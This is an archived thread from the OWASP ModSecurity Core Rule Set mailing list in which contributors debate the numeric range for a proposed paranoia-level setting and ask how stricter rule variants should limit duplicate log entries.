If we clone rules to stricter siblings, we?ll produce a lot of log entries.
Requests with more than 5 special characters and a paranoia level of
40 will create three distinct log-entries in turn.
Is that the behavior that we want?
Maybe we have to write the siblings in a way that only one rule
matches, even at a high paranoia level?
Example: SecRule ARGS_NAMES|ARGS|XML:/*
"([\~\!\@\#\$\%\^\&\*\(\)\-\+\=\{\}\[\]\|\:\;\"\'\?\?\?\`\<\>].*?){3,4}"
\

Regards,
Franziska

2016-02-09 5:53 GMT+01:00 Chaim Sanders <CSanders at trustwave.com>:
> Thanks Noel!
> I will say @Christian that every time we leave space we never end up using
> the space we leave I?d vote for just 0-4, but it is just one mans opinion.
>
> On 2/8/16, 11:20 PM,
> "owasp-modsecurity-core-rule-set-bounces at lists.owasp.org on behalf of No?l
> Zindel" <owasp-modsecurity-core-rule-set-bounces at lists.owasp.org on behalf
> of mail at noelzindel.org> wrote:
>
>>Hi everyone,
>>
>>let me chime in on this.
>>
> >From a newbie perspective, I?d argue, the 0-4 definition would make sense
>>since it would be a logical choice.
>>You should be able to easily distinct between the paranoia rating and the
>>anomaly rating through the latter?s variable-definition e.g. warning,
>>critical, ?
>>
>>Nevertheless, Christian?s argument ?If we leave some room between the
>>numbers, we have room to fill them in the future.? favours 0-40.
>>At least for me, since I like the idea of planning way ahead.
>>
>>So, from my point of view, a range of 0-40 would be the favourable
>>choice. But, it?s arbitrary nature would require a well-curated
>>documentation.
>>
>>It?s good to see the community?s commitment on this and I hope to be of
>>any help.
>>
>>Cheers,
>>No?l
>>
>>> On 08 Feb 2016, at 22:12, Christian Folini
>>><christian.folini at netnea.com> wrote:
>>>
>>> Thanks Chaim and Lukas!
>>>
>>> I got positive feedback via private messages too.
>>>
>>> The one question, where I am still unsure (and the
>>> feedback / criticism is also split) is the question
>>> of the good integer range for the paranoia level.
>>> 0-4 or rather 0-40.
>>>
>>> Still not sure.
>>>
>>> Thoughts on this question are thus very welcome.
>>>
>>> Ahoj,
>>>
>>> Christian
>>>
>>>
>>> On Mon, Feb 08, 2016 at 02:31:47PM +0000, Chaim Sanders wrote:
>>>> Good writeup Christian!
>>>>
>>>> On 2/8/16, 2:59 AM,
>>>> "owasp-modsecurity-core-rule-set-bounces at lists.owasp.org on behalf of
>>>> Funk, Lukas" <owasp-modsecurity-core-rule-set-bounces at lists.owasp.org
>>>>on
>>>> behalf of Lukas.Funk at united-security-providers.ch> wrote:
>>>>
>>>>> Hi Christian and all,
>>>>>
>>>>> I follow the discussion about the paranoia mode with great interest. I
>>>>> think it could be a good starting point for ModSecurity users which do
>>>>> not have the expert knowledge of the rules.
>>>>>
>>>>> Looking at your proposed structure of the paranoia mode setup, I think
>>>>> it's on a good track. The structure is easy to understand!
>>>>> Unfortunately I can't comment the different rules, as I don't have
>>>>>much
>>>>> experience with them.
>>>>>
>>>>> Thanks to all of you putting such great effort to the CRS and I'm
>>>>>really
>>>>> looking forward to version 3!
>>>>>
>>>>> Cheers, Lukas
>>>>>
>>>>>
>>>>>>> Dear all,
>>>>>>>
>>>>>>> With the progress we are making on the rules front, it is time to
>>>>>>>talk
>>>>>>> about
>>>>>>> the way it could be implemented.
>>>>>>> It's time for the show-me-the-code. He you go:
>>>>>>>
>>>>>>>
>>>>>>>
>>>>>>>http://scanmail.trustwave.com/?c=4062&d=tN-41hG4qCjBMKf0XEE90boFBx23N
>>>>>>>XMA
>>>>>>>
>>>>>>>8kit7zcE9Q&s=5&u=https%3a%2f%2fwww%2enetnea%2ecom%2fcms%2f2016%2f02%2
>>>>>>>f04
>>>>>>> %2fowasp-modsecurity-core-rules-
>>>>>>> paranoia-mode-mechanics-proposal/
>>>>>>>
>>>>>>> Feedback welcome!
>>>>>>>
>>>>>>> Christian
>>>>
>>>>
>>>> ________________________________
>>>>
>>>> This transmission may contain information that is privileged,
>>>>confidential, and/or exempt from disclosure under applicable law. If
>>>>you are not the intended recipient, you are hereby notified that any
>>>>disclosure, copying, distribution, or use of the information contained
>>>>herein (including any reliance thereon) is strictly prohibited. If you
>>>>received this transmission in error, please immediately contact the
>>>>sender and destroy the material in its entirety, whether in electronic
>>>>or hard copy format.
>>>> _______________________________________________
>>>> Owasp-modsecurity-core-rule-set mailing list
>>>> Owasp-modsecurity-core-rule-set at lists.owasp.org
>>>>
>>>>http://scanmail.trustwave.com/?c=4062&d=kvC51uiCoFG6D9Z7NWTJ-HkiUDGrZPVd
>>>>MSLLMAERYA&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%
>>>>2fowasp-modsecurity-core-rule-set
>>>
>>> --
>>> mailto:christian.folini at netnea.com
>>>
>>>http://scanmail.trustwave.com/?c=4062&d=kvC51uiCoFG6D9Z7NWTJ-HkiUDGrZPVdM
>>>SeebAdKbQ&s=5&u=http%3a%2f%2fwww%2echristian-folini%2ech
>>> twitter: @ChrFolini
>>> _______________________________________________
>>> Owasp-modsecurity-core-rule-set mailing list
>>> Owasp-modsecurity-core-rule-set at lists.owasp.org
>>>
>>>http://scanmail.trustwave.com/?c=4062&d=kvC51uiCoFG6D9Z7NWTJ-HkiUDGrZPVdM
>>>SLLMAERYA&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2f
>>>owasp-modsecurity-core-rule-set
>>
>
>
> ________________________________
>
> This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.
> _______________________________________________
> Owasp-modsecurity-core-rule-set mailing list
> Owasp-modsecurity-core-rule-set at lists.owasp.org
> https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set

From Lukas.Funk at united-security-providers.ch  Tue Feb  9 15:35:49 2016
From: Lukas.Funk at united-security-providers.ch (Funk, Lukas)
Date: Tue, 9 Feb 2016 15:35:49 +0000
Subject: [Owasp-modsecurity-core-rule-set] Paranoid vs. Paranoia Mode
Message-ID: <93BE8A5FB0778E48BF7BF2A9B09D7A580BA9A1EB@uspEXCH02.u-s-p.local>

Hi,

I was just having another look into the AuditConsole and stumbled over this screenshot: https://jwall.org/web/audit/console/screenshots/event-view2.png

What caught my eye was in the Rules Section "setvar:tx.paranoid_mode=0" and it made me curious what that is.
I could find anything in the latest CRS and also noting in older version in the GitHub repo...

Googling I found this old message from the mailing list:
https://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/2011-February/000621.html

It shows a configuration with CRS 2.1.1 and there is a section -=[ Paranoid Mode ]=-...
Reading the description, it sound something similar Christian and others like to achieve right now.

Has anybody an idea why it was removed? It might be helpful for further consideration implementing the new paranoia mode...

Regards, Lukas
-------------- next part --------------
A non-text attachment was scrubbed...
Name: smime.p7s
Type: application/x-pkcs7-signature
Size: 5505 bytes
Desc: not available
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20160209/bd46b5ff/attachment.bin>

From CSanders at trustwave.com  Tue Feb  9 15:42:40 2016
From: CSanders at trustwave.com (Chaim Sanders)
Date: Tue, 9 Feb 2016 15:42:40 +0000
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Mechanics
 Proposal
In-Reply-To: <CALrdzmLmv28uT5A35fjMw8xNJg7Etqt9MjY1xd1h_VNx+qR3eg@mail.gmail.com>
References: <20160204095200.GA28896@elias>
	<93BE8A5FB0778E48BF7BF2A9B09D7A580BA99C3A@uspEXCH02.u-s-p.local>
	<D2DE10F9.17557%csanders@trustwave.com> <20160208211212.GB29344@elias>
	<438205E8-4FDE-4D2B-A17E-4244D73901B1@noelzindel.org>
	<D2DEDAEE.175A2%csanders@trustwave.com>
	<CALrdzmLmv28uT5A35fjMw8xNJg7Etqt9MjY1xd1h_VNx+qR3eg@mail.gmail.com>
Message-ID: <D2DF72D9.175FF%csanders@trustwave.com>

Well it seems like everyone likes this out of 40 scale and honestly I?m
not opposed :).

On 2/9/16, 3:58 AM,
"owasp-modsecurity-core-rule-set-bounces at lists.owasp.org on behalf of
Franziska Buehler"
<owasp-modsecurity-core-rule-set-bounces at lists.owasp.org on behalf of
franziska.buehler.schmocker at gmail.com> wrote:

>Dear Christian,
>Dear all,
>
>Very clear and reasoned writing!
>I see a benefit to choose the numbering of the paranoia level between 0
>and 40.
>It?s distinguishable from the anomaly scoring and does not lead to
>misunderstanding.
>Default set to 10 sounds good for me.
>But I also see Chaim?s point not to leave that space.
>
>Another question:
>If we clone rules to stricter siblings, we?ll produce a lot of log
>entries.
>Requests with more than 5 special characters and a paranoia level of
>40 will create three distinct log-entries in turn.
>Is that the behavior that we want?
>Maybe we have to write the siblings in a way that only one rule
>matches, even at a high paranoia level?
>Example: SecRule ARGS_NAMES|ARGS|XML:/*
>"([\~\!\@\#\$\%\^\&\*\(\)\-\+\=\{\}\[\]\|\:\;\"\'\?\?\?\`\<\>].*?){3,4}"
>\
>
>Regards,
>Franziska
>
>2016-02-09 5:53 GMT+01:00 Chaim Sanders <CSanders at trustwave.com>:
>> Thanks Noel!
>> I will say @Christian that every time we leave space we never end up
>>using
>> the space we leave I?d vote for just 0-4, but it is just one mans
>>opinion.
>>
>> On 2/8/16, 11:20 PM,
>> "owasp-modsecurity-core-rule-set-bounces at lists.owasp.org on behalf of
>>No?l
>> Zindel" <owasp-modsecurity-core-rule-set-bounces at lists.owasp.org on
>>behalf
>> of mail at noelzindel.org> wrote:
>>
>>>Hi everyone,
>>>
>>>let me chime in on this.
>>>
>> >From a newbie perspective, I?d argue, the 0-4 definition would make
>>sense
>>>since it would be a logical choice.
>>>You should be able to easily distinct between the paranoia rating and
>>>the
>>>anomaly rating through the latter?s variable-definition e.g. warning,
>>>critical, ?
>>>
>>>Nevertheless, Christian?s argument ?If we leave some room between the
>>>numbers, we have room to fill them in the future.? favours 0-40.
>>>At least for me, since I like the idea of planning way ahead.
>>>
>>>So, from my point of view, a range of 0-40 would be the favourable
>>>choice. But, it?s arbitrary nature would require a well-curated
>>>documentation.
>>>
>>>It?s good to see the community?s commitment on this and I hope to be of
>>>any help.
>>>
>>>Cheers,
>>>No?l
>>>
>>>> On 08 Feb 2016, at 22:12, Christian Folini
>>>><christian.folini at netnea.com> wrote:
>>>>
>>>> Thanks Chaim and Lukas!
>>>>
>>>> I got positive feedback via private messages too.
>>>>
>>>> The one question, where I am still unsure (and the
>>>> feedback / criticism is also split) is the question
>>>> of the good integer range for the paranoia level.
>>>> 0-4 or rather 0-40.
>>>>
>>>> Still not sure.
>>>>
>>>> Thoughts on this question are thus very welcome.
>>>>
>>>> Ahoj,
>>>>
>>>> Christian
>>>>
>>>>
>>>> On Mon, Feb 08, 2016 at 02:31:47PM +0000, Chaim Sanders wrote:
>>>>> Good writeup Christian!
>>>>>
>>>>> On 2/8/16, 2:59 AM,
>>>>> "owasp-modsecurity-core-rule-set-bounces at lists.owasp.org on behalf of
>>>>> Funk, Lukas" <owasp-modsecurity-core-rule-set-bounces at lists.owasp.org
>>>>>on
>>>>> behalf of Lukas.Funk at united-security-providers.ch> wrote:
>>>>>
>>>>>> Hi Christian and all,
>>>>>>
>>>>>> I follow the discussion about the paranoia mode with great
>>>>>>interest. I
>>>>>> think it could be a good starting point for ModSecurity users which
>>>>>>do
>>>>>> not have the expert knowledge of the rules.
>>>>>>
>>>>>> Looking at your proposed structure of the paranoia mode setup, I
>>>>>>think
>>>>>> it's on a good track. The structure is easy to understand!
>>>>>> Unfortunately I can't comment the different rules, as I don't have
>>>>>>much
>>>>>> experience with them.
>>>>>>
>>>>>> Thanks to all of you putting such great effort to the CRS and I'm
>>>>>>really
>>>>>> looking forward to version 3!
>>>>>>
>>>>>> Cheers, Lukas
>>>>>>
>>>>>>
>>>>>>>> Dear all,
>>>>>>>>
>>>>>>>> With the progress we are making on the rules front, it is time to
>>>>>>>>talk
>>>>>>>> about
>>>>>>>> the way it could be implemented.
>>>>>>>> It's time for the show-me-the-code. He you go:
>>>>>>>>
>>>>>>>>
>>>>>>>>
>>>>>>>>http://scanmail.trustwave.com/?c=4062&d=tN-41hG4qCjBMKf0XEE90boFBx2
>>>>>>>>3N
>>>>>>>>XMA
>>>>>>>>
>>>>>>>>8kit7zcE9Q&s=5&u=https%3a%2f%2fwww%2enetnea%2ecom%2fcms%2f2016%2f02
>>>>>>>>%2
>>>>>>>>f04
>>>>>>>> %2fowasp-modsecurity-core-rules-
>>>>>>>> paranoia-mode-mechanics-proposal/
>>>>>>>>
>>>>>>>> Feedback welcome!
>>>>>>>>
>>>>>>>> Christian
>>>>>
>>>>>
>>>>> ________________________________
>>>>>
>>>>> This transmission may contain information that is privileged,
>>>>>confidential, and/or exempt from disclosure under applicable law. If
>>>>>you are not the intended recipient, you are hereby notified that any
>>>>>disclosure, copying, distribution, or use of the information contained
>>>>>herein (including any reliance thereon) is strictly prohibited. If you
>>>>>received this transmission in error, please immediately contact the
>>>>>sender and destroy the material in its entirety, whether in electronic
>>>>>or hard copy format.
>>>>> _______________________________________________
>>>>> Owasp-modsecurity-core-rule-set mailing list
>>>>> Owasp-modsecurity-core-rule-set at lists.owasp.org
>>>>>
>>>>>http://scanmail.trustwave.com/?c=4062&d=kvC51uiCoFG6D9Z7NWTJ-HkiUDGrZP
>>>>>Vd
>>>>>MSLLMAERYA&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinf
>>>>>o%
>>>>>2fowasp-modsecurity-core-rule-set
>>>>
>>>> --
>>>> mailto:christian.folini at netnea.com
>>>>
>>>>http://scanmail.trustwave.com/?c=4062&d=kvC51uiCoFG6D9Z7NWTJ-HkiUDGrZPV
>>>>dM
>>>>SeebAdKbQ&s=5&u=http%3a%2f%2fwww%2echristian-folini%2ech
>>>> twitter: @ChrFolini
>>>> _______________________________________________
>>>> Owasp-modsecurity-core-rule-set mailing list
>>>> Owasp-modsecurity-core-rule-set at lists.owasp.org
>>>>
>>>>http://scanmail.trustwave.com/?c=4062&d=kvC51uiCoFG6D9Z7NWTJ-HkiUDGrZPV
>>>>dM
>>>>SLLMAERYA&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%
>>>>2f
>>>>owasp-modsecurity-core-rule-set
>>>
>>
>>
>> ________________________________
>>
>> This transmission may contain information that is privileged,
>>confidential, and/or exempt from disclosure under applicable law. If you
>>are not the intended recipient, you are hereby notified that any
>>disclosure, copying, distribution, or use of the information contained
>>herein (including any reliance thereon) is strictly prohibited. If you
>>received this transmission in error, please immediately contact the
>>sender and destroy the material in its entirety, whether in electronic
>>or hard copy format.
>> _______________________________________________
>> Owasp-modsecurity-core-rule-set mailing list
>> Owasp-modsecurity-core-rule-set at lists.owasp.org
>>
>>http://scanmail.trustwave.com/?c=4062&d=qrC51mJ-5yUuJU_THDo8E9rr9Bk2G9RKB
>>N9PIoKQJw&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2f
>>owasp-modsecurity-core-rule-set
>_______________________________________________
>Owasp-modsecurity-core-rule-set mailing list
>Owasp-modsecurity-core-rule-set at lists.owasp.org
>http://scanmail.trustwave.com/?c=4062&d=qrC51mJ-5yUuJU_THDo8E9rr9Bk2G9RKBN
>9PIoKQJw&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2fow
>asp-modsecurity-core-rule-set


________________________________

This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.

From mail at noelzindel.org  Tue Feb  9 17:15:56 2016
From: mail at noelzindel.org (=?utf-8?Q?No=C3=ABl_Zindel?=)
Date: Tue, 9 Feb 2016 18:15:56 +0100
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Mechanics
	Proposal
In-Reply-To: <D2DF72D9.175FF%csanders@trustwave.com>
References: <20160204095200.GA28896@elias>
	<93BE8A5FB0778E48BF7BF2A9B09D7A580BA99C3A@uspEXCH02.u-s-p.local>
	<D2DE10F9.17557%csanders@trustwave.com>
	<20160208211212.GB29344@elias>
	<438205E8-4FDE-4D2B-A17E-4244D73901B1@noelzindel.org>
	<D2DEDAEE.175A2%csanders@trustwave.com>
	<CALrdzmLmv28uT5A35fjMw8xNJg7Etqt9MjY1xd1h_VNx+qR3eg@mail.gmail.com>
	<D2DF72D9.175FF%csanders@trustwave.com>
Message-ID: <E6FE8BF0-0E89-44AF-9910-559AF7963098@noelzindel.org>

Glad seeing your openness towards this, Chaim.

In the end, to me, it seems to be a usability-functionality trade-off.
The degree of complexity added by some additional space should not amount for the potential functionality.

And, you never know what the future holds ;)

> On 09 Feb 2016, at 16:42, Chaim Sanders <CSanders at trustwave.com> wrote:
> 
> Well it seems like everyone likes this out of 40 scale and honestly I?m
> not opposed :).
> 
> On 2/9/16, 3:58 AM,
> "owasp-modsecurity-core-rule-set-bounces at lists.owasp.org <mailto:owasp-modsecurity-core-rule-set-bounces at lists.owasp.org> on behalf of
> Franziska Buehler"
> <owasp-modsecurity-core-rule-set-bounces at lists.owasp.org <mailto:owasp-modsecurity-core-rule-set-bounces at lists.owasp.org> on behalf of
> franziska.buehler.schmocker at gmail.com <mailto:franziska.buehler.schmocker at gmail.com>> wrote:
> 
>> Dear Christian,
>> Dear all,
>> 
>> Very clear and reasoned writing!
>> I see a benefit to choose the numbering of the paranoia level between 0
>> and 40.
>> It?s distinguishable from the anomaly scoring and does not lead to
>> misunderstanding.
>> Default set to 10 sounds good for me.
>> But I also see Chaim?s point not to leave that space.
>> 
>> Another question:
>> If we clone rules to stricter siblings, we?ll produce a lot of log
>> entries.
>> Requests with more than 5 special characters and a paranoia level of
>> 40 will create three distinct log-entries in turn.
>> Is that the behavior that we want?
>> Maybe we have to write the siblings in a way that only one rule
>> matches, even at a high paranoia level?
>> Example: SecRule ARGS_NAMES|ARGS|XML:/*
>> "([\~\!\@\#\$\%\^\&\*\(\)\-\+\=\{\}\[\]\|\:\;\"\'\?\?\?\`\<\>].*?){3,4}"
>> \
>> 
>> Regards,
>> Franziska
>> 
>> 2016-02-09 5:53 GMT+01:00 Chaim Sanders <CSanders at trustwave.com>:
>>> Thanks Noel!
>>> I will say @Christian that every time we leave space we never end up
>>> using
>>> the space we leave I?d vote for just 0-4, but it is just one mans
>>> opinion.
>>> 
>>> On 2/8/16, 11:20 PM,
>>> "owasp-modsecurity-core-rule-set-bounces at lists.owasp.org on behalf of
>>> No?l
>>> Zindel" <owasp-modsecurity-core-rule-set-bounces at lists.owasp.org on
>>> behalf
>>> of mail at noelzindel.org> wrote:
>>> 
>>>> Hi everyone,
>>>> 
>>>> let me chime in on this.
>>>> 
>>>> From a newbie perspective, I?d argue, the 0-4 definition would make
>>> sense
>>>> since it would be a logical choice.
>>>> You should be able to easily distinct between the paranoia rating and
>>>> the
>>>> anomaly rating through the latter?s variable-definition e.g. warning,
>>>> critical, ?
>>>> 
>>>> Nevertheless, Christian?s argument ?If we leave some room between the
>>>> numbers, we have room to fill them in the future.? favours 0-40.
>>>> At least for me, since I like the idea of planning way ahead.
>>>> 
>>>> So, from my point of view, a range of 0-40 would be the favourable
>>>> choice. But, it?s arbitrary nature would require a well-curated
>>>> documentation.
>>>> 
>>>> It?s good to see the community?s commitment on this and I hope to be of
>>>> any help.
>>>> 
>>>> Cheers,
>>>> No?l
>>>> 
>>>>> On 08 Feb 2016, at 22:12, Christian Folini
>>>>> <christian.folini at netnea.com> wrote:
>>>>> 
>>>>> Thanks Chaim and Lukas!
>>>>> 
>>>>> I got positive feedback via private messages too.
>>>>> 
>>>>> The one question, where I am still unsure (and the
>>>>> feedback / criticism is also split) is the question
>>>>> of the good integer range for the paranoia level.
>>>>> 0-4 or rather 0-40.
>>>>> 
>>>>> Still not sure.
>>>>> 
>>>>> Thoughts on this question are thus very welcome.
>>>>> 
>>>>> Ahoj,
>>>>> 
>>>>> Christian
>>>>> 
>>>>> 
>>>>> On Mon, Feb 08, 2016 at 02:31:47PM +0000, Chaim Sanders wrote:
>>>>>> Good writeup Christian!
>>>>>> 
>>>>>> On 2/8/16, 2:59 AM,
>>>>>> "owasp-modsecurity-core-rule-set-bounces at lists.owasp.org on behalf of
>>>>>> Funk, Lukas" <owasp-modsecurity-core-rule-set-bounces at lists.owasp.org
>>>>>> on
>>>>>> behalf of Lukas.Funk at united-security-providers.ch> wrote:
>>>>>> 
>>>>>>> Hi Christian and all,
>>>>>>> 
>>>>>>> I follow the discussion about the paranoia mode with great
>>>>>>> interest. I
>>>>>>> think it could be a good starting point for ModSecurity users which
>>>>>>> do
>>>>>>> not have the expert knowledge of the rules.
>>>>>>> 
>>>>>>> Looking at your proposed structure of the paranoia mode setup, I
>>>>>>> think
>>>>>>> it's on a good track. The structure is easy to understand!
>>>>>>> Unfortunately I can't comment the different rules, as I don't have
>>>>>>> much
>>>>>>> experience with them.
>>>>>>> 
>>>>>>> Thanks to all of you putting such great effort to the CRS and I'm
>>>>>>> really
>>>>>>> looking forward to version 3!
>>>>>>> 
>>>>>>> Cheers, Lukas
>>>>>>> 
>>>>>>> 
>>>>>>>>> Dear all,
>>>>>>>>> 
>>>>>>>>> With the progress we are making on the rules front, it is time to
>>>>>>>>> talk
>>>>>>>>> about
>>>>>>>>> the way it could be implemented.
>>>>>>>>> It's time for the show-me-the-code. He you go:
>>>>>>>>> 
>>>>>>>>> 
>>>>>>>>> 
>>>>>>>>> http://scanmail.trustwave.com/?c=4062&d=tN-41hG4qCjBMKf0XEE90boFBx2
>>>>>>>>> 3N
>>>>>>>>> XMA
>>>>>>>>> 
>>>>>>>>> 8kit7zcE9Q&s=5&u=https%3a%2f%2fwww%2enetnea%2ecom%2fcms%2f2016%2f02
>>>>>>>>> %2
>>>>>>>>> f04
>>>>>>>>> %2fowasp-modsecurity-core-rules-
>>>>>>>>> paranoia-mode-mechanics-proposal/
>>>>>>>>> 
>>>>>>>>> Feedback welcome!
>>>>>>>>> 
>>>>>>>>> Christian
>>>>>> 
>>>>>> 
>>>>>> ________________________________
>>>>>> 
>>>>>> This transmission may contain information that is privileged,
>>>>>> confidential, and/or exempt from disclosure under applicable law. If
>>>>>> you are not the intended recipient, you are hereby notified that any
>>>>>> disclosure, copying, distribution, or use of the information contained
>>>>>> herein (including any reliance thereon) is strictly prohibited. If you
>>>>>> received this transmission in error, please immediately contact the
>>>>>> sender and destroy the material in its entirety, whether in electronic
>>>>>> or hard copy format.
>>>>>> _______________________________________________
>>>>>> Owasp-modsecurity-core-rule-set mailing list
>>>>>> Owasp-modsecurity-core-rule-set at lists.owasp.org
>>>>>> 
>>>>>> http://scanmail.trustwave.com/?c=4062&d=kvC51uiCoFG6D9Z7NWTJ-HkiUDGrZP
>>>>>> Vd
>>>>>> MSLLMAERYA&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinf
>>>>>> o%
>>>>>> 2fowasp-modsecurity-core-rule-set
>>>>> 
>>>>> --
>>>>> mailto:christian.folini at netnea.com
>>>>> 
>>>>> http://scanmail.trustwave.com/?c=4062&d=kvC51uiCoFG6D9Z7NWTJ-HkiUDGrZPV
>>>>> dM
>>>>> SeebAdKbQ&s=5&u=http%3a%2f%2fwww%2echristian-folini%2ech
>>>>> twitter: @ChrFolini
>>>>> _______________________________________________
>>>>> Owasp-modsecurity-core-rule-set mailing list
>>>>> Owasp-modsecurity-core-rule-set at lists.owasp.org
>>>>> 
>>>>> http://scanmail.trustwave.com/?c=4062&d=kvC51uiCoFG6D9Z7NWTJ-HkiUDGrZPV
>>>>> dM
>>>>> SLLMAERYA&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%
>>>>> 2f
>>>>> owasp-modsecurity-core-rule-set
>>>> 
>>> 
>>> 
>>> ________________________________
>>> 
>>> This transmission may contain information that is privileged,
>>> confidential, and/or exempt from disclosure under applicable law. If you
>>> are not the intended recipient, you are hereby notified that any
>>> disclosure, copying, distribution, or use of the information contained
>>> herein (including any reliance thereon) is strictly prohibited. If you
>>> received this transmission in error, please immediately contact the
>>> sender and destroy the material in its entirety, whether in electronic
>>> or hard copy format.
>>> _______________________________________________
>>> Owasp-modsecurity-core-rule-set mailing list
>>> Owasp-modsecurity-core-rule-set at lists.owasp.org
>>> 
>>> http://scanmail.trustwave.com/?c=4062&d=qrC51mJ-5yUuJU_THDo8E9rr9Bk2G9RKB <http://scanmail.trustwave.com/?c=4062&d=qrC51mJ-5yUuJU_THDo8E9rr9Bk2G9RKB>
>>> N9PIoKQJw&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2f
>>> owasp-modsecurity-core-rule-set
>> _______________________________________________
>> Owasp-modsecurity-core-rule-set mailing list
>> Owasp-modsecurity-core-rule-set at lists.owasp.org <mailto:Owasp-modsecurity-core-rule-set at lists.owasp.org>
>> http://scanmail.trustwave.com/?c=4062&d=qrC51mJ-5yUuJU_THDo8E9rr9Bk2G9RKBN <http://scanmail.trustwave.com/?c=4062&d=qrC51mJ-5yUuJU_THDo8E9rr9Bk2G9RKBN>
>> 9PIoKQJw&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2fow
>> asp-modsecurity-core-rule-set
> 
> 
> ________________________________
> 
> This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.
> _______________________________________________
> Owasp-modsecurity-core-rule-set mailing list
> Owasp-modsecurity-core-rule-set at lists.owasp.org <mailto:Owasp-modsecurity-core-rule-set at lists.owasp.org>
> https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set <https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set>
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20160209/2b87ae81/attachment-0001.html>
-------------- next part --------------
A non-text attachment was scrubbed...
Name: signature.asc
Type: application/pgp-signature
Size: 801 bytes
Desc: Message signed with OpenPGP using GPGMail
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20160209/2b87ae81/attachment-0001.pgp>

From CSanders at trustwave.com  Tue Feb  9 17:43:44 2016
From: CSanders at trustwave.com (Chaim Sanders)
Date: Tue, 9 Feb 2016 17:43:44 +0000
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode:
	Mechanics	Proposal
In-Reply-To: <E6FE8BF0-0E89-44AF-9910-559AF7963098@noelzindel.org>
References: <20160204095200.GA28896@elias>
	<93BE8A5FB0778E48BF7BF2A9B09D7A580BA99C3A@uspEXCH02.u-s-p.local>
	<D2DE10F9.17557%csanders@trustwave.com>	<20160208211212.GB29344@elias>
	<438205E8-4FDE-4D2B-A17E-4244D73901B1@noelzindel.org>
	<D2DEDAEE.175A2%csanders@trustwave.com>
	<CALrdzmLmv28uT5A35fjMw8xNJg7Etqt9MjY1xd1h_VNx+qR3eg@mail.gmail.com>
	<D2DF72D9.175FF%csanders@trustwave.com>
	<E6FE8BF0-0E89-44AF-9910-559AF7963098@noelzindel.org>
Message-ID: <DM2PR0701MB1295268634F994173F7C9E76DBD60@DM2PR0701MB1295.namprd07.prod.outlook.com>

Yep, that?s my thinking ? also the it is best to let the community decide what they need ? I am but one member of that community. Thank you for your two cents Noel and please, keep committing, without help from people like you it is very hard to decide on features like this!

From: owasp-modsecurity-core-rule-set-bounces at lists.owasp.org [mailto:owasp-modsecurity-core-rule-set-bounces at lists.owasp.org] On Behalf Of No?l Zindel
Sent: Tuesday, February 09, 2016 12:16 PM
To: owasp-modsecurity-core-rule-set at lists.owasp.org
Subject: Re: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Mechanics Proposal

Glad seeing your openness towards this, Chaim.

In the end, to me, it seems to be a usability-functionality trade-off.
The degree of complexity added by some additional space should not amount for the potential functionality.

And, you never know what the future holds ;)

On 09 Feb 2016, at 16:42, Chaim Sanders <CSanders at trustwave.com<mailto:CSanders at trustwave.com>> wrote:

Well it seems like everyone likes this out of 40 scale and honestly I?m
not opposed :).

On 2/9/16, 3:58 AM,
"owasp-modsecurity-core-rule-set-bounces at lists.owasp.org<mailto:owasp-modsecurity-core-rule-set-bounces at lists.owasp.org> on behalf of
Franziska Buehler"
<owasp-modsecurity-core-rule-set-bounces at lists.owasp.org<mailto:owasp-modsecurity-core-rule-set-bounces at lists.owasp.org> on behalf of
franziska.buehler.schmocker at gmail.com<mailto:franziska.buehler.schmocker at gmail.com>> wrote:


Dear Christian,
Dear all,

Very clear and reasoned writing!
I see a benefit to choose the numbering of the paranoia level between 0
and 40.
It?s distinguishable from the anomaly scoring and does not lead to
misunderstanding.
Default set to 10 sounds good for me.
But I also see Chaim?s point not to leave that space.

Another question:
If we clone rules to stricter siblings, we?ll produce a lot of log
entries.
Requests with more than 5 special characters and a paranoia level of
40 will create three distinct log-entries in turn.
Is that the behavior that we want?
Maybe we have to write the siblings in a way that only one rule
matches, even at a high paranoia level?
Example: SecRule ARGS_NAMES|ARGS|XML:/*
"([\~\!\@\#\$\%\^\&\*\(\)\-\+\=\{\}\[\]\|\:\;\"\'\?\?\?\`\<\>].*?){3,4}"
\

Regards,
Franziska

2016-02-09 5:53 GMT+01:00 Chaim Sanders <CSanders at trustwave.com<mailto:CSanders at trustwave.com>>:

Thanks Noel!
I will say @Christian that every time we leave space we never end up
using
the space we leave I?d vote for just 0-4, but it is just one mans
